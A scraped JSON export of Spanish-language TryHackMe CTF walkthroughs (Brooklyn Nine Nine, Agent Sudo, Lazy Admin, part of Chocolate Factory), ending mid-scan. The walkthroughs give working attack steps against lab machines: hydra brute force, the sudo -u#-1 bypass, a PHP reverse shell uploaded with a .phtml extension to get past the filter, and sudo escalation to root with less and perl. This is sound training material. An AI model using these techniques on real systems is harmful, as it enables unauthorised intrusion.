10.10.10.10","tags":["Walkthroughs","Fácil","Linux"],"title":"Vulnversity"},{"content":"","date":"2022-12-18","id":88,"permalink":"/tags/walkthroughs/","summary":"","tags":[],"title":"Walkthroughs"},{"content":"https://tryhackme.com/room/brooklynninenine\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.243.15\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.243.15 PING 10.10.243.15 (10.10.243.15) 56(84) bytes of data. 64 bytes from 10.10.243.15: icmp_seq=1 ttl=63 time=96.3 ms --- 10.10.243.15 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 96.338/96.338/96.338/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.243.15 -oG allPort Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.100.94 5 │ [*] Open ports: 21,22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p21,22,80 -sC -sV 10.10.243.15 -oN target PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.10.10 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 3 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 0 0 119 May 17 2020 note_to_jake.txt 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 167fa2ffe0fba98777d6d3eb62572c6a3 (RSA) | 256 2e3b61594bc429ba5e858396f6fe99bee (ECDSA) |_ 256 ab162e79203c9b0a019c8c4426015a804 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Site doesn\u0026#39;t have a title (text/html). |_http-server-header: Apache/2.4.29 (Ubuntu) Parámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Puerto 21 El nmap reporto que nos podemos conectar al puerto 21 como anonymous (ftp-anon: Anonymous FTP login allowed)\nDentro hay un archivo llamado note_to_jake.txt que nos lo podemos pasar a nuestra máquina con get note_to_jake.txt\nContenido note_to_jake.txt Dentro del archivo note_to_jake.txt hay el siguiente mensaje\nFrom Amy,\nJake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine\nDe Amy,\nJake por favor cambia tu contraseña. Es demasiado débil y Holt se enojará si alguien piratea el nueve nueve.\nViendo este mensaje vemos que hay tres usuarios:\nAmy Holt Jake Infiltración Amy dice que la contraseña de Jake es demasiado débil, sabiendo esto podemos intentar con hyra hacer fuerza bruta al ssh como jake.\nHydra se considera el software para ciberseguridad estándar para ejecutar ataques de fuerza bruta en cuentas de servicios.\n❯ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.92.221 ssh -t 40 [22][ssh] host: 10.10.84.47 login: jake password: --------- Ahora ya nos podemos conectar por ssh como jake\nssh jake@10.10.84.47 Tratamiento de tty Antes para trabajar mejor vamos a hacer un tratamiento de la terminal con los siguientes comandos:\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm user.txt En el directorio /home/jake y /home/amy no hay nada, pero en el /home/holt está el user.txt\nEscalada de privilegios ❯ sudo -l User jake may run the following commands on brookly_nine_nine: (ALL) NOPASSWD: /usr/bin/less ¿Qué es less? Less es un programa similar a more, pero que permite retroceder movimiento en el archivo, asi como el movimiento hacia adelante. además, menos no tiene que leer todo el archivo de entrada antes de comenzar, por lo que con archivos de entrada grandes, se inicia más rápido que los editores de texto como vi\n¿Como escalar con less? Si el binario puede ejecutarse como superusuario sudo, no pierde los privilegios elevados y puede usarse para acceder al sistema de archivos, escalar o mantener el acceso privilegiado.\nLo primero es ejecutar less con sudo y especificarle un archivo que queremos leer, por ejemplo user.txt\nsudo less user.txt Después si escribimos !/bin/bash y le damos a enter, ya somos root\nroot@brookly_nine_nine:/home/holt# whoami root ","date":"2022-12-17","id":89,"permalink":"/writeups/tryhackme/brooklyn-nine-nine/","summary":"https://tryhackme.com/room/brooklynninenine\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.243.15\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","Fuerza bruta","less"],"title":"Brooklyn Nine Nine"},{"content":"","date":"2022-12-17","id":90,"permalink":"/tags/less/","summary":"","tags":[],"title":"less"},{"content":"Bienvenido a otra sala CTF exclusiva de THM. Tu tarea es simple, captura las banderas. ¡Que te diviertas!\nhttps://tryhackme.com/room/agentsudoctf\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.92.221\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.92.221 PING 10.10.92.221 (10.10.92.221) 56(84) bytes of data. 64 bytes from 10.10.92.221: icmp_seq=1 ttl=63 time=128 ms --- 10.10.92.221 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 127.854/127.854/127.854/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.92.221 -oG allPort Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.92.221 5 │ [*] Open ports: 21,22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p21,22,80 -sC -sV 10.10.92.221 -oN target PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ef1f5d04d4779506d6072ecf058f2cc07 (RSA) | 256 5e02d19ac4e7430662c19e25848aed7ea (ECDSA) |_ 256 2d005cdb9fda8c8d880e3924f8b4f18e2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Annoucement |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Parámetro Función -p21,22,80 Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Puerto 80 Hay una web con el siguiente texto en la página principal:\nDear agents,\nUse your own codename as user-agent to access the site.\nFrom, Agent R\nEstimados agentes,\nUtilice su propio nombre en clave como agente de usuario para acceder al sitio.\nDe, Agente R\nSegún el texto podemos usar el \u0026ldquo;nombre en clave\u0026rdquo; como \u0026ldquo;user agent\u0026rdquo;. Vemos que está firmado como Agente R, se puede suponer que los agentes tienen una letra como nombre en clave. Con curl -A \u0026quot;A\u0026quot; 10.10.92.221 podemos ver la web como Agente A, pero ir probando así hasta la z se puede hacer eterno, para eso e echo un script en python que atomatiza el proceso de las peticiones y guarda las repuestas distintas.\nUser-Agent o también conocido como Agente de Usuario es una cabecera de texto que sirve para identificar al usuario que entra en una página web a través del navegador.\nfrom pwn import * import requests, signal, time, pbd, sys, string, os main_url = \u0026#34;http://10.10.92.221\u0026#34; characters = string.ascii_uppercase standard = requests.get(main_url) different = \u0026#34;\u0026#34; p1 = log.progress(\u0026#34;Trying with Agent\u0026#34;) p2 = log.progress(\u0026#34;Agents with different response\u0026#34;) for i in characters: headers = { \u0026#39;User-Agent\u0026#39;: i } response = requests.get(main_url, headers=headers) p1.status(i) if response.text != standard.text: different += \u0026#34; {},\u0026#34;.format(i) p2.status(different) f = open (\u0026#39;agent_{}.txt\u0026#39;.format(i) ,\u0026#39;w\u0026#39;) f.write(response.text) print(\u0026#34;\\n[*] Result saved on agent_{}.txt\u0026#34;.format(i)) f.close() Al ejecutarlo encuentra respuestas distintas con el Agente C y el Agente R\n❯ python3 script.py [*] Trying with Agent: Z [*] Agents with different response: C, R, [*] Result saved on agent_C.txt [*] Result saved on agent_R.txt Dentro del agente_C.txt hay el siguiente mensaje\nDo you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!\n¿Todavía recuerdas nuestro trato? Por favor, dígale al agente J sobre las cosas lo antes posible. Además, cambia tu maldita contraseña, ¡es débil!\nComo dice que su contraseña es débil con hydra vamos a intentar encontrarla usando un diccionario.\nHydra se considera el software para ciberseguridad estándar para ejecutar ataques de fuerza bruta en cuentas de servicios.\nhydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.92.221 -t 40 Parámetro Función -l Usuario -P Diccionario -t Velocidad Infiltración Puerto 21 El hydra encuentra la contraseña y ya podemos conectarnos por ftp como chris, dentro hay 3 archivos: To_agentJ.txt, cute-alien.jpg y cutie.png. Con get archivo nos los podemos pasar a nuestra máquina.\nContenido de To_agentJ.txt\nDear agent J,\nAll these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn\u0026rsquo;t be a problem for you.\nFrom, Agent C\nEstimado agente J,\n¡Todas estas fotos alienígenas son falsas! El Agente R almacenó la imagen real dentro de su directorio. Su contraseña de inicio de sesión se almacena de alguna manera en la imagen falsa. No debería ser un problema para ti.\nDe, Agente C\ncute-alien.jpg El Agente C dice que dentro de esta foto hay la contraseña de inicio de session del Agente J. Con steghide podemos intentar ver su contenido\n❯ steghide extract -sf cute-alien.jpg Anotar salvoconducto: steghide: �no pude extraer ning�n dato con ese salvoconducto! No encuentra nada sin indicar salvoconducto. Para ello vamos a usar esta herramienta: https://github.com/RickdeJager/stegseek para atraves de un diccionario poder conseguir el contenido oculto de la foto.\n❯ stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt StegSeek 0.6 - https://github.com/RickdeJager/StegSeek [i] Found passphrase: \u0026#34;Area51\u0026#34; [i] Original filename: \u0026#34;message.txt\u0026#34;. [i] Extracting to \u0026#34;cute-alien.jpg.out\u0026#34;. message.txt Contenido del archivo message.txt renombrado a cute-alien.jpg.out\nHi james,\nGlad you find this message. Your login password is censored!\nDon\u0026rsquo;t ask me why the password look cheesy, ask agent R who set this password for you.\nYour buddy, chris\nHola James,\nMe alegro de que encuentres este mensaje. ¡Su contraseña de inicio de sesión es censurado!\nNo me pregunte por qué la contraseña parece cursi, pregúntele al agente R quién estableció esta contraseña para usted.\nTu amigo, cris\nPuerto 22 Ahora ya tenemos las credenciales de james y nos podemos conectar por ssh\nYa podemos ver la flag de user.txt\nEscalada de privilegios con sudo -l podemos ver que puede ejecutar como root\njames@agent-sudo:~$ sudo -l User james may run the following commands on agent-sudo: (ALL, !root) /bin/bash E buscado el (ALL, !root) /bin/bash en google y e encontrado que esto es porque el sudo tiene una versión menor a la 1.8.27 lo que lo hace vulnerable. Se puede confirmar con:\njames@agent-sudo:~$ sudo --version Sudo version 1.8.21p2 En el exploit (https://www.exploit-db.com/exploits/47502) lo que pone es que podemos ejecutar cosas con sudo de la siguiente forma:\nsudo -u#-1 /bin/bash\nDe echo ejecutando eso ya somos root y podemos ver la flag en el /root/root.txt\n","date":"2022-12-15","id":91,"permalink":"/writeups/tryhackme/agent-sudo/","summary":"Bienvenido a otra sala CTF exclusiva de THM. Tu tarea es simple, captura las banderas. ¡Que te diviertas!\nhttps://tryhackme.com/room/agentsudoctf\nIP Atacante = 10.","tags":["CTF","Fácil","Linux","Fuerza bruta","CVE-2019-14287","Archivos ocultos"],"title":"Agent sudo"},{"content":"","date":"2022-12-15","id":92,"permalink":"/tags/archivos-ocultos/","summary":"","tags":[],"title":"Archivos ocultos"},{"content":"","date":"2022-12-15","id":93,"permalink":"/tags/cve-2019-14287/","summary":"","tags":[],"title":"CVE-2019-14287"},{"content":"","date":"2022-12-14","id":94,"permalink":"/tags/hash-md5/","summary":"","tags":[],"title":"hash md5"},{"content":"Máquina fácil Linux para practicar tus habilidades.\nhttps://tryhackme.com/room/lazyadmin\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.192.128\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\n❯ ping -c 1 10.10.192.128 PING 10.10.192.128 (10.10.192.128) 56(84) bytes of data. 64 bytes from 10.10.192.128: icmp_seq=1 ttl=63 time=66.1 ms --- 10.10.192.128 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 66.057/66.057/66.057/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\nnmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.192.128 -oG allPorts Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPorts Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n❯ extractPorts allPorts ───────┬───────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼───────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.29.188 5 │ [*] Open ports: 22,80 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴───────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ sudo nmap -p22,80 -sC -sV 10.10.192.128 -Pn target PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 497cf741104373da2ce63s89586f8e0f0 (RSA) | 256 2fd7c44ce81b5sa9044dfc0638c72ae55 (ECDSA) |_ 256 6184622s7c6c32917dd27459e29cb905e (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Parámetro Función -p22,80 Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Puerto 80 Al entrar a la web lo primero que se ve es lo siguiente\nBuscando subdirectorios Para ver si hay subdirectorios vamos a usar la herramienta wfuzz para fusear mediante un diccionario que está en /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt con el siguiente comando:\nwfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.192.128/FUZZ ======================================================================= ID Response Lines Word Chars Payload ======================================================================= 000000075: 301 9 L 28 W 316 Ch \u0026#34;content\u0026#34; 000095524: 403 9 L 28 W 278 Ch \u0026#34;server-status\u0026#34; Parámetro Función -c Para que lo reporte todo con colores -t Para configurar el tiempo \u0026ndash;hc=404 Para que no nos reporte los subdirectorios que no existan -w Es donde se indica el diccionario FUZZ Se escribe donde quieres aplicar el diccionario Dentro de /content solo hay un texto\nTraducción: Bienvenido a SweetRice - Gracias por instalar SweetRice como su sistema de administración de sitios web. Este sitio se está construyendo ahora, por favor llegue tarde. Si usted es el webmaster, vaya a Dashboard -\u0026gt; General -\u0026gt; Configuración del sitio web y desmarque la casilla de verificación \u0026ldquo;Cerrar sitio\u0026rdquo; para abrir su sitio web. Más ayuda en Consejo para Basic CMS SweetRice instalado\nBuscando subdirectorios en /content/ ❯ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.192.128/content/FUZZ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000016: 301 9 L 28 W 323 Ch \u0026#34;images\u0026#34; 000000953: 301 9 L 28 W 319 Ch \u0026#34;js\u0026#34; 000002190: 301 9 L 28 W 320 Ch \u0026#34;inc\u0026#34; 000003320: 301 9 L 28 W 319 Ch \u0026#34;as\u0026#34; 000003601: 301 9 L 28 W 324 Ch \u0026#34;_themes\u0026#34; 000003808: 301 9 L 28 W 327 Ch \u0026#34;attachment\u0026#34; Credenciales Inicio Session Dentro del /inc hay una carpeta llamada mysql_backup/ dentro hay un archivo llamado mysql_bakup_20191129023059-1.5.1.sql nos lo descargamos, dentro se puede ver un usuario llamado manager con un hash --------------\n❯ hash-identifier -------------- Possible Hashs: [+] MD5 Para ver el contenido vamos a usar John the Ripper\nJohn The Ripper es una herramienta de código abierto para la recuperación y auditoría de seguridad en contraseñas, además de ser multiplataforma, es el más utilizado y versátil, ya que combina una velocidad de “craqueo” rápida, con una extraordinaria gama de tipos de hash compatibles.\n❯ sudo john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3]) Warning: no OpenMP support for this hash type, consider --fork=8 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Password Censurada (?) 1g 0:00:00:00 DONE (2022-12-14 21:28) 100.0g/s 3379Kp/s 3379Kc/s 3379KC/s 062089..redlips Session completed. Ahora ya podemos iniciar sessión en el panel de login que está en /content/as\nCon esto entramos a un directorio que parece ser el panel de control del administrador, hay muchos apartados, pero hay uno (media center) En el cual podemos subir archivos.\nReverse shell Vamos a intentar subir un archivo.php malicioso echo por pentestmonkey para crear una reverse shell\nwget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php Importante cambiar esto con la ip de nuestra máquina y el puerto en el que vamos a estar en escucha\n$ip = \u0026#39;10.10.10.10\u0026#39;; // CHANGE THIS $port = 443; // CHANGE THIS Ahora ya lo podemos subir\nNo se ha subido, puede ser que al ser .php lo haya bloqueado\u0026hellip; En estas situaciones, se puede intentar con extensiones menos típicas de php que el admin no haya bloqueado.\nEjemplos de alternativas a .php: .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module\nPrimero vamos a probar con .phtml\n¡Ahora si!\nNos ponemos en escucha por el puerto 443\nnc -nlvp 443 Clicamos el archivo que hemos subido anteriormente a la web y recibimos la conexión\nTratamiento de la tty Antes de empezar lo primero para trabajar mejor es hacer un tratamiento de la tty\u0026hellip;\nscript /dev/null -c bash ctrl + z\nstty raw -echo; fg reset xterm export SHELL=bash export TERM=xterm Escalada de privilegios Con sudo -l se puede ver que podemos ejecutar /usr/bin/perl y /home/itguy/backup.pl\nSi vamos al /home/itguy/, y hacemos un cat a backup.pl se ve que ejecuta un archivo que está en /etc/copy.sh\n(Contenido backup.pl)\n#!/usr/bin/perl system(\u0026#34;sh\u0026#34;, \u0026#34;/etc/copy.sh\u0026#34;); En este archivo no tenemos permisos de escritura, pero en el copy.sh sí. Vamos a hacer una prueba para ver si lo que ponemos en copy.sh se ejecuta como root\nwww-data@THM-Chal:/$ echo \u0026#34;whoami\u0026#34; \u0026gt; /etc/copy.sh www-data@THM-Chal:/$ sudo perl /home/itguy/backup.pl root Efectivamente se ejecuta como root, ahora vamos a decirle al copy.sh que spawnee una bash\nwww-data@THM-Chal:/$ echo \u0026#34;/bin/bash -i\u0026#34; \u0026gt; /etc/copy.sh www-data@THM-Chal:/$ sudo perl /home/itguy/backup.pl root@THM-Chal:/# ¡Ya somos root!\nCon un cat /root/root.txt podemos ver la flag\n","date":"2022-12-14","id":95,"permalink":"/writeups/tryhackme/lazy-admin/","summary":"Máquina fácil Linux para practicar tus habilidades.\nhttps://tryhackme.com/room/lazyadmin\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.192.128\nReconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene","tags":["CTF","Fácil","Linux","Archivos ocultos","hash md5","file upload"],"title":"Lazy admin"},{"content":"Un ctf temática de Charlie y la fábrica de chocolate, vuelve a visitar la fábrica de chocolate de Willy Wonka.\nhttps://tryhackme.com/room/chocolatefactory\nPara empezar lo primero es comprobar si la máquina está activa y que OS tiene\nIP Atacante = 10.10.10.10\nIP víctima = 10.10.250.47\n❯ ping -c 1 10.10.250.47 PING 10.10.250.47 (10.10.250.47) 56(84) bytes of data. 64 bytes from 10.10.250.47: icmp_seq=1 ttl=63 time=52.3 ms --- 10.10.250.47 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 52.300/52.300/52.300/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux por aproximación\nEscaneo de puertos (nmap) Ahora empezamos con un escaneo de puertos\n❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.250.47 -oG allPort PORT STATE SERVICE REASON 21/tcp open ftp syn-ack ttl 63 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 100/tcp open newacct syn-ack ttl 63 101/tcp open hostname syn-ack ttl 63 102/tcp open iso-tsap syn-ack ttl 63 103/tcp open gppitnp syn-ack ttl 63 104/tcp open acr-nema syn-ack ttl 63 105/tcp open csnet-ns syn-ack ttl 63 106/tcp open pop3pw syn-ack ttl 63 107/tcp open rtelnet syn-ack ttl 63 108/tcp open snagas syn-ack ttl 63 109/tcp open pop2 syn-ack ttl 63 110/tcp open pop3 syn-ack ttl 63 111/tcp open rpcbind syn-ack ttl 63 112/tcp open mcidas syn-ack ttl 63 113/tcp open ident syn-ack ttl 63 114/tcp open audionews syn-ack ttl 63 115/tcp open sftp syn-ack ttl 63 116/tcp open ansanotify syn-ack ttl 63 117/tcp open uucp-path syn-ack ttl 63 118/tcp open sqlserv syn-ack ttl 63 119/tcp open nntp syn-ack ttl 63 120/tcp open cfdptkt syn-ack ttl 63 121/tcp open erpc syn-ack ttl 63 122/tcp open smakynet syn-ack ttl 63 123/tcp open ntp syn-ack ttl 63 124/tcp open ansatrader syn-ack ttl 63 125/tcp open locus-map syn-ack ttl 63 Parámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos -sS \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Skip host discovery -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n───────┬────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.250.47 5 │ [*] Open ports: 21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112, │ 113,114,115,116,117,118,119,120,121,122,123,124,125 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos\n❯ nmap -p21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125 -sV -sC 10.10.250.47 -oN target PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-rw-r-- 1 1000 1000 208838 Sep 30 2020 gum_room.jpg | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.10.10 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 1631bbfb51fcccc12148ff0d833b0089b (RSA) | 256 e71fc9dbj3eaa44b672103ceedb1d3390 (ECDSA) |_ 256 b44502b62478gea9065f6c79448a06555e (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). 100/tcp open newacct? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 101/tcp open hostname? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 102/tcp open iso-tsap? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 103/tcp open gppitnp? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 104/tcp open acr-nema? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\\x20__\u0026#39;_;-----------------` | \\|______________________;________________| | small hint from Mr.Wonka : Look somewhere else, its not here! ;) |_ hope you wont drown Augustus\u0026#34; 105/tcp open csnet-ns? | fingerprint-strings: | GenericLines, NULL: | \u0026#34;Welcome to chocolate room!! | ___.---------------. | .\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__,` . ____ ___ \\r | _:\\x20 |:. \\x20 ___ \\r | \\\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;__\u0026#39;_`.__| `. \\x20 